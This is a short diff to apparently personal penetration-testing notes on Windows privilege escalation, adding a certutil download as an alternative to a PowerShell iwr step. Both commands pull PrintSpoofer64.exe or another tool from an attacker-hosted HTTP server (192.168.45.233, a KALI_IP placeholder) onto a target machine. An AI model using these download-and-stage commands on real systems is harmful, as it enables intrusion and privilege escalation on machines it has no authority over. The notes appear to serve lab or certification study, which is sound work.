@@ -41,9 +41,13 @@ Look at the **`OS Name`** and **`OS Version`** lines `systeminfo` prints, then m
 ```bash
 cd /home/nepps1/tools/potatoes && python3 -m http.server 80
 ```
-**Target** (pull, from your PS shell):
+**Target** (pull, from your PS or cmd shell):
 ```powershell
 iwr http://192.168.45.233/PrintSpoofer64.exe -o C:\Users\Public\p.exe
+```
+or
+```cmd
+certutil.exe -urlcache -f http://<KALI_IP>:8000/<file> C:\Users\Public\p.exe
 ```
 
 ---
